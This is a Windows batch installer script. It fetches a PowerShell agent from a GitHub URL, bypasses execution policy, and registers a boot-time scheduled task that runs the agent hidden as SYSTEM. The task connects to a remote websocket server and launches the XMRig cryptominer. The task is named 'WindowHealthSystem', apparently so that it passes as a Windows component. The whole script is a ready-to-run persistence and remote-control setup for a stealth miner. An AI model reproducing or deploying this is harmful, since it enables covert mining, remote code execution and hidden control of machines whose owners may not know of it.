@echo off
title PC-Agent Installer
color 0A

:: ============================================================
::  EDIT THESE 3 LINES BEFORE RUNNING
:: ============================================================
set DEVICE_NAME=My-PC
set SERVER_URL=wss://com-cont.onrender.com
set XMRIG_PATH=C:\Mining\xmrig\xmrig.exe
:: ============================================================

echo.
echo  ============================
echo   PC-Agent Installer
echo  ============================
echo.

:: Check if running as Admin
NET SESSION >nul 2>&1
IF %ERRORLEVEL% NEQ 0 (
    echo  ERROR: Not running as Administrator!
    echo.
    echo  Please do this:
    echo    1. Right-click this file
    echo    2. Click "Run as administrator"
    echo.
    pause
    exit /b
)

echo  Running as Administrator... OK
echo  Device : %DEVICE_NAME%
echo  Server : %SERVER_URL%
echo  XMRig  : %XMRIG_PATH%
echo.

:: Create directory
echo  [1/4] Creating directory...
mkdir "C:\ProgramData\PC-Agent" 2>nul
echo        C:\ProgramData\PC-Agent  OK
echo.

:: Download agent.ps1
echo  [2/4] Downloading agent script...
powershell -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/omshukla001/com-cont/main/agent.ps1' -OutFile 'C:\ProgramData\PC-Agent\agent.ps1'"

IF NOT EXIST "C:\ProgramData\PC-Agent\agent.ps1" (
    echo.
    echo  ERROR: Download failed!
    echo  Check your internet connection.
    echo.
    pause
    exit /b 1
)
echo        Downloaded OK
echo.

:: Unblock the file
powershell -Command "Unblock-File -Path 'C:\ProgramData\PC-Agent\agent.ps1'" 2>nul

:: Create scheduled task
echo  [3/4] Creating scheduled task...
schtasks /delete /tn "WindowHealthSystem" /f >nul 2>&1
schtasks /create /tn "WindowHealthSystem" /tr "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\ProgramData\PC-Agent\agent.ps1 -DeviceName '%DEVICE_NAME%' -ServerUrl '%SERVER_URL%' -XmrigPath '%XMRIG_PATH%'" /sc onstart /ru SYSTEM /rl HIGHEST /f
echo        Scheduled task created OK
echo.

:: Start it now
echo  [4/4] Starting agent in background...
schtasks /run /tn "WindowHealthSystem" >nul 2>&1
echo        Agent started OK
echo.

echo  ============================
echo   DONE!
echo  ============================
echo.
echo  Agent is running in the background.
echo  It will auto-start on every boot.
echo.
echo  Dashboard: https://com-cont.onrender.com
echo  Logs:      C:\ProgramData\PC-Agent\agent.log
echo.
echo  Press any key to close this window...
pause >nul
